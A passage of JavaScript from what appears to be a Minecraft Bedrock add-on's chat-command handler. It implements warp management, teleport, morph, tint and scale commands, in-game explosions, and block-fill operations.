                }
                break;
            case !!switchTest.match(/^warplist$/):
                eventData.cancel = true;
                let warpListE = String(world.getDynamicProperty("globalWarpListValues")).split("||||");
                for (let i in warpListE) {
                    warpListE[i] = warpListE[i].split(", ")[0];
                }
                if (warpListE.length == 1) {
                    eventData.sender.sendMessage("You have no global warps, set them with \\warpset");
                }
                else {
                    try {
                        eventData.sender.sendMessage(warpListE.join("\n").escapeCharacters(true));
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                }
                break;
            case !!switchTest.match(/^warplistrawdata$/):
                eventData.cancel = true;
                try {
                    eventData.sender.sendMessage("Global Warp List Raw Data: \n" + String(world.getDynamicProperty("globalWarpListValues")));
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^warpreset$/):
                eventData.cancel = true;
                try {
                    system.run(() => { world.setDynamicProperty("globalWarpListValues"); });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                try {
                    eventData.sender.sendMessage("Global warps lists has been reset. ");
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^wset$/):
                eventData.cancel = true;
                let wList = String(player.getDynamicProperty("warpList")).split("||||"); /*
                console.warn("wasdqrte\\sanwqhieasdrt\\p\\nasqw".replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f")*/ /*.replaceAll(/[\\x]/g, "\x").replaceAll(/[\\u]/g, "\u")*/ /*.replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, ""))*/
                switch (wList.find((findWarp) => (findWarp.split(", ")[0].escapeCharacters(true).replaceAll("|", "\\u007c") == newMessage.split(" ").slice(5).join(" ").escapeCharacters(true).replaceAll("|", "\\u007c"))) == undefined) {
                    case false: /*
                    if (newMessage.split(" ").slice(5).join(" ").replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f").replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, "").replaceAll(", ", " ") == ""){*/ /*eventData.sender.sendMessage("§cError: missing required \"name\" field. "); */ /*break; */ /*}*/
                        try {
                            wList[wList.findIndex((warpItem) => (warpItem.split(", ")[0].escapeCharacters(true).replaceAll("|", "\\u007c") == newMessage.split(" ").slice(5).join(" ").escapeCharacters(true).replaceAll("|", "\\u007c")))] = String(newMessage.split(" ").slice(5).join(" ").replaceAll(", ", " ").replaceAll("|", "\\u007c") + ", " + world.getDimension(newMessage.split(" ")[1]).id + ", " + Number(newMessage.split(" ")[2]) + ", " + Number(newMessage.split(" ")[3]) + ", " + Number(newMessage.split(" ")[4]));
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                            break;
                        }
                        try {
                            system.run(() => { player.setDynamicProperty("warpList", wList.join("||||")); });
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            eventData.sender.sendMessage("Set warp \"" + newMessage.split(" ").slice(5).join(" ").escapeCharacters(true) + "\" at dimension: " + newMessage.split(" ")[1] + ", x: " + newMessage.split(" ")[2] + ", y: " + newMessage.split(" ")[3] + ", z: " + newMessage.split(" ")[4] + ". ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case true:
                        try {
                            wList.push(String(newMessage.split(" ").slice(5).join(" ").replaceAll(", ", " ").replaceAll("|", "\\u007c") + ", " + newMessage.split(" ")[1] + ", " + newMessage.split(" ")[2] + ", " + newMessage.split(" ")[3] + ", " + newMessage.split(" ")[4]));
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            system.run(() => { player.setDynamicProperty("warpList", wList.join("||||")); });
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            eventData.sender.sendMessage("Added warp \"" + newMessage.split(" ").slice(5).join(" ").escapeCharacters(true) + "\" at dimension: " + newMessage.split(" ")[1] + ", x: " + newMessage.split(" ")[2] + ", y: " + newMessage.split(" ")[3] + ", z: " + newMessage.split(" ")[4] + ". ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                }
                break;
            case !!switchTest.match(/^wremove$/):
                eventData.cancel = true;
                let wListB = String(player.getDynamicProperty("warpList")).split("||||"); /*
                console.warn("wasdqrte\\sanwqhieasdrt\\p\\nasqw".replaceAll(/(?<!\\p)\\n/g, "\n").replaceAll(/(?<!\\p)\\s/g, "\s").replaceAll(/(?<!\\p)\\0/g, "\0").replaceAll(/(?<!\\p)\\r/g, "\r").replaceAll(/(?<!\\p)\\t/g, "\t").replaceAll(/(?<!\\p)\\v/g, "\v").replaceAll(/(?<!\\p)\\f/g, "\f")*/ /*.replaceAll(/[\\x]/g, "\x").replaceAll(/[\\u]/g, "\u")*/ /*.replaceAll(/(?<!\\p)\\k/g, "\k").replaceAll(/(?<!\\p)\\p/g, ""))*/
                switch (wListB.find((findWarp) => (findWarp.split(", ")[0].escapeCharacters(true).replaceAll("|", "\\u007c") == newMessage.split(" ").slice(1).join(" ").escapeCharacters(true).replaceAll("|", "\\u007c"))) == undefined) {
                    case false:
                        try {
                            system.run(() => { wListB[wListB.findIndex((findWarp) => (findWarp.split(", ")[0].escapeCharacters(true).replaceAll("|", "\\u007c") == newMessage.split(" ").slice(1).join(" ").escapeCharacters(true).replaceAll("|", "\\u007c")))] = undefined; player.setDynamicProperty("warpList", wListB.join("||||")); });
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            eventData.sender.sendMessage("Removed warp with name \"" + newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) + "\". ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case true:
                        try {
                            eventData.sender.sendMessage("§cError: could not find warp \"" + newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) + "\". ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                }
                break;
            case !!switchTest.match(/^w$/):
                eventData.cancel = true;
                let wListD = String(player.getDynamicProperty("warpList")).split("||||");
                let warpB = undefined;
                switch (wListD.find((findWarp) => (findWarp.split(", ")[0] == newMessage.split(" ").slice(1).join(" ").escapeCharacters(true).replaceAll(", ", " "))) == undefined) {
                    case false:
                        try {
                            warpB = wListD.find((findWarp) => (findWarp.split(", ")[0] == newMessage.split(" ").slice(1).join(" ").escapeCharacters(true).replaceAll("|", "\\u007c"))).split(", ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            system.run(() => { player.teleport({ x: Number(warpB[2]), y: Number(warpB[3]), z: Number(warpB[4]) }, { dimension: world.getDimension(String(warpB[1])), keepVelocity: false }); });
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        try {
                            eventData.sender.sendMessage("Warped to \"" + newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) + "\". ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                    case true:
                        try {
                            eventData.sender.sendMessage("§cError: could not find warp \"" + newMessage.split(" ").slice(1).join(" ").escapeCharacters(true) + "\". ");
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        break;
                }
                break;
            case !!switchTest.match(/^wlistdetails$/):
                eventData.cancel = true;
                let wListC = String(player.getDynamicProperty("warpList")).split("||||");
                if (wListC.length == 1) {
                    eventData.sender.sendMessage("You have no warps, set them with \\wset");
                }
                else {
                    try {
                        eventData.sender.sendMessage(wListC.join("\n").escapeCharacters(true));
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                }
                break;
            case !!switchTest.match(/^wlist$/):
                eventData.cancel = true;
                let wListE = String(player.getDynamicProperty("warpList")).split("||||");
                for (let i in wListE) {
                    wListE[i] = wListE[i].split(", ")[0];
                }
                if (wListE.length == 1) {
                    eventData.sender.sendMessage("You have no warps, set them with \\wset");
                }
                else {
                    try {
                        eventData.sender.sendMessage(wListE.join("\n").escapeCharacters(true));
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                }
                break;
            case !!switchTest.match(/^wlistrawdata$/):
                eventData.cancel = true;
                try {
                    eventData.sender.sendMessage("Warp List Raw Data: \n" + String(player.getDynamicProperty("warpList")));
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^wreset$/):
                eventData.cancel = true;
                try {
                    system.run(() => { player.setDynamicProperty("warpList", undefined); });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                try {
                    eventData.sender.sendMessage("Warps lists has been reset. ");
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^up$/):
                eventData.cancel = true;
                try {
                    system.run(() => { if (player.dimension.getBlock(player.location).above(Number(newMessage.split(" ")[1]) - 1).typeId == "minecraft:air" && (((newMessage.split(" ")[2]?.toLowerCase() != "false") && (newMessage.split(" ")[2] != "0")) || (newMessage.split(" ")[2] == undefined))) {
                        player.dimension.getBlock(player.location).above(Number(newMessage.split(" ")[1]) - 1).setType("minecraft:glass");
                    } ; player.teleport({ x: player.location.x, y: player.dimension.getBlock(player.location).above(Number(newMessage.split(" ")[1])).location.y, z: player.location.z }); eventData.sender.sendMessage(String()); });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^top$/):
                eventData.cancel = true;
                try {
                    system.run(() => { let block = getTopSolidBlock(player.dimension.getBlock(player.location), player.dimension); if (block != undefined) {
                        player.teleport({ x: player.location.x, y: block.y + 1, z: player.location.z }, {});
                    }
                    else {
                        eventData.sender.sendMessage("§4No block could be found. ");
                    } ; eventData.sender.sendMessage("Teleported to highest block at coordinates: " + player.location.x + ", " + player.location.y + ", " + player.location.z); targetSelectorAllListE("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", player.location.x + " " + player.location.y + " " + player.location.z).forEach((entity) => { entity.sendMessage("Teleported to highest block at coordinates: " + player.location.x + ", " + player.location.y + ", " + player.location.z); }); });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^printlayers$/):
                eventData.cancel = true;
                try {
                    system.run(() => { let block = getTopSolidBlock(player.dimension.getBlock(player.location), player.dimension); let messageCustom = ""; let a = 0; while (a != 1) {
                        if (messageCustom.endsWith(block.typeId + "; ")) { }
                        else {
                            messageCustom = messageCustom + block.y + ". " + block.typeId + "; ";
                        }
                        ;
                        try {
                            block = block.below(1);
                        }
                        catch {
                            a = 1;
                        }
                    } ; player.sendMessage(messageCustom); eventData.sender.sendMessage("Teleported to highest block at coordinates: " + player.location.x + ", " + player.location.y + ", " + player.location.z); targetSelectorAllListE("@a [tag=canSeeCustomChatCommandFeedbackFromMods]", player.location.x + " " + player.location.y + " " + player.location.z).forEach((entity) => { entity.sendMessage("Printed blocks at: x: " + player.location.x + ", z: " + player.location.z); }); });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^morph$/):
                eventData.cancel = true;
                try {
                    system.run(() => { if (newMessage.split(" ")[2] == undefined) {
                        player.setProperty("andexpr:entity_type", Number(newMessage.split(" ")[1]));
                    }
                    else {
                        targetSelectorAllListB(newMessage.split(" ").slice(2).join(" "), "", Number(player.id)).forEach((p) => { p.setProperty("andexpr:entity_type", Number(newMessage.split(" ")[1])); });
                    } });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^tint$/):
                eventData.cancel = true;
                try {
                    system.run(() => { if (newMessage.split(" ")[6] == undefined) {
                        player.setProperty("andexpr:color_tint_r", (Number((newMessage.split(" ")[1] ?? "~").replaceAll("~", String(player.getProperty("andexpr:color_tint_r")))) ?? player.getProperty("andexpr:color_tint_r")));
                        player.setProperty("andexpr:color_tint_g", (Number((newMessage.split(" ")[2] ?? "~").replaceAll("~", String(player.getProperty("andexpr:color_tint_g")))) ?? player.getProperty("andexpr:color_tint_g")));
                        player.setProperty("andexpr:color_tint_b", (Number((newMessage.split(" ")[3] ?? "~").replaceAll("~", String(player.getProperty("andexpr:color_tint_b")))) ?? player.getProperty("andexpr:color_tint_b")));
                        player.setProperty("andexpr:color_tint_a", (Number((newMessage.split(" ")[4] ?? "~").replaceAll("~", String(player.getProperty("andexpr:color_tint_a")))) ?? player.getProperty("andexpr:color_tint_a")));
                        player.setProperty("andexpr:use_alphablend_player_materials", (Number((newMessage.split(" ")[5] ?? "~").replaceAll("~", String(player.getProperty("andexpr:use_alphablend_player_materials")))) ?? player.getProperty("andexpr:use_alphablend_player_materials")));
                    }
                    else {
                        targetSelectorAllListB(newMessage.split(" ").slice(6).join(" "), "", Number(player.id)).forEach((p) => { p.setProperty("andexpr:color_tint_r", (Number((newMessage.split(" ")[1] ?? "~").replaceAll("~", String(p.getProperty("andexpr:color_tint_r")))) ?? p.getProperty("andexpr:color_tint_r"))); p.setProperty("andexpr:color_tint_g", (Number((newMessage.split(" ")[2] ?? "~").replaceAll("~", String(p.getProperty("andexpr:color_tint_g")))) ?? p.getProperty("andexpr:color_tint_g"))); p.setProperty("andexpr:color_tint_b", (Number((newMessage.split(" ")[3] ?? "~").replaceAll("~", String(p.getProperty("andexpr:color_tint_b")))) ?? p.getProperty("andexpr:color_tint_b"))); p.setProperty("andexpr:color_tint_a", (Number((newMessage.split(" ")[4] ?? "~").replaceAll("~", String(p.getProperty("andexpr:color_tint_a")))) ?? p.getProperty("andexpr:color_tint_a"))); p.setProperty("andexpr:use_alphablend_player_materials", (Number((newMessage.split(" ")[5] ?? "~").replaceAll("~", String(p.getProperty("andexpr:use_alphablend_player_materials")))) ?? p.getProperty("andexpr:use_alphablend_player_materials"))); });
                    } });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + " " + e.stack);
                }
                break;
            case !!switchTest.match(/^scale$/):
                eventData.cancel = true;
                try {
                    system.run(() => { if (newMessage.split(" ")[2] == undefined) {
                        player.getComponent("scale").value = Number(newMessage.split(" ")[1]);
                    }
                    else {
                        targetSelectorAllListE(newMessage.split(" ").slice(2).join(" "), "~~~").forEach((p) => { p.setProperty("andexpr:entity_type", Number(newMessage.split(" ")[1])); });
                    } });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^visualscale$/):
                eventData.cancel = true;
                try {
                    system.run(() => { if (newMessage.split(" ")[2] == undefined) {
                        player.setProperty("andexpr:entity_scale_variable_override", Number(newMessage.split(" ")[1]));
                    }
                    else {
                        targetSelectorAllListE(newMessage.split(" ").slice(2).join(" "), "~~~").forEach((p) => { p.setProperty("andexpr:entity_type", Number(newMessage.split(" ")[1])); });
                    } });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^visualscaleenabled$/):
                eventData.cancel = true;
                try {
                    system.run(() => { if (newMessage.split(" ")[2] == undefined) {
                        player.setProperty("andexpr:entity_scale_variable_override_enabled", Boolean(newMessage.split(" ")[1].replaceAll("false", "").replaceAll("0", "").replaceAll("False", "").replaceAll("0.0", "")));
                    }
                    else {
                        targetSelectorAllListE(newMessage.split(" ").slice(2).join(" "), "~~~").forEach((p) => { p.setProperty("andexpr:entity_type", Number(newMessage.split(" ")[1])); });
                    } });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^tps$/):
                eventData.cancel = true;
                try {
                    player.runCommandAsync("/scriptevent andexsa:getTPSExtraDetails");
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^managescriptautoeval$/):
                eventData.cancel = true;
                try {
                    system.run(() => { if (newMessage.split(" ")[2] == undefined) {
                        player.setProperty("andexpr:entity_scale_variable_override_enabled", Boolean(newMessage.split(" ")[1].replaceAll("false", "").replaceAll("0", "").replaceAll("False", "").replaceAll("0.0", "")));
                    }
                    else {
                        targetSelectorAllListE(newMessage.split(" ").slice(2).join(" "), "~~~").forEach((p) => { p.setProperty("andexpr:entity_type", Number(newMessage.split(" ")[1])); });
                    } });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^mainmenu$/):
                eventData.cancel = true;
                try {
                    system.run(() => mainMenu(player));
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^terminal$/):
                eventData.cancel = true;
                try {
                    system.run(() => terminal(player));
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^managecommands$/):
                eventData.cancel = true;
                try {
                    system.run(() => manageCommands(player));
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^manageplayers$/):
                eventData.cancel = true;
                try {
                    system.run(() => managePlayers(player));
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^settings$/):
                eventData.cancel = true;
                try {
                    system.run(() => settings(player));
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^datapickblock$/):
                eventData.cancel = true;
                try {
                    let item = player.getBlockFromViewDirection({ includeLiquidBlocks: true, includePassableBlocks: true }).block.getItemStack(1, true);
                    system.run(() => { player.getComponent("inventory").container.addItem(item); });
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^createexplosion$/):
                eventData.cancel = true;
                if (switchTestB.trim().split(" ").length == 1) {
                    player.sendMessage(`createexplosion command format: \n${command.dp}createexplosion <location: x y z> [dimension: string] [radius: float] [allowUnderwater: bool] [breaksBlocks: bool] [causesFire: bool] [source: targetSelector]`);
                }
                else {
                    srun(() => {
                        try {
                            const args = evaluateParameters(switchTestB, ["presetText", "Vector3", "string", "number", "boolean", "boolean", "boolean", "targetSelector"]).args;
                            const d = world.getDimension((args[2] ?? "~").replaceAll("~", player.dimension.id));
                            const l = coordinatesB(args[1], player.location, player.getViewDirection());
                            const options = { allowUnderwater: args[4] ?? false, breaksBlocks: args[5] ?? true, causesFire: args[6] ?? false, source: (args[7] ?? "").trim() == "" ? undefined : targetSelectorAllListC(args[7], "", vTStr(player.location), player)[0] };
                            let s = d.createExplosion(l, args[3] ?? 1, options);
                            s ? player.sendMessage(`Successfully created an explosion at ${vTStr(l)} with radius ${args[3]} with the options: ${JSONStringify(options, true)}. `) : player.sendMessage(`§cError: Failed to create an explosion at ${vTStr(l)} with radius ${args[3]} with the options: ${JSONStringify(options, true)}. `);
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                    });
                }
                break;
            case !!switchTest.match(/^fill$/):
                {
                    eventData.cancel = true;
                    if (switchTestB.trim().split(" ").length == 1) {
                        player.sendMessage(`fill command format: \n${command.dp}fill <from: x y z> <to: x y z> <tileName: Block> [blockStates: block states] [replaceTileName: Block] [replaceBlockStates: block states]\n${command.dp}fill <from: x y z> <to: x y z> <tileName: Block> <replaceTileName: Block> [replaceBlockStates: block states]`);
                    }
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? undefined : lastblockname == "keep" ? BlockPermutation.resolve("air") : BlockPermutation.resolve(lastblockname, lastblockstates); /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    try {
                        srun(() => { let a = player.dimension.fillBlocks(coordinatesa, coordinatesb, BlockPermutation.resolve(firstblockname, firstblockstates), { matchingBlock: matchingblock }); player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled`); });
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^ifill$/):
                {
                    eventData.cancel = true;
                    if (switchTestB.trim().split(" ").length == 1) {
                        player.sendMessage(`itfill command format: 
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <blockStates: block states> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> <ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r> <reaplceTileName: Block> [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> [ifillMode: replace|fill|cube|keep|walls|hollow|outline|pillars§c|floor|ceilling|diamond|hourglass§r] [clearContainers: boolean]
${command.dp}ifill <from: x y z> <to: x y z> <tileName: Block> [clearContainers: boolean]
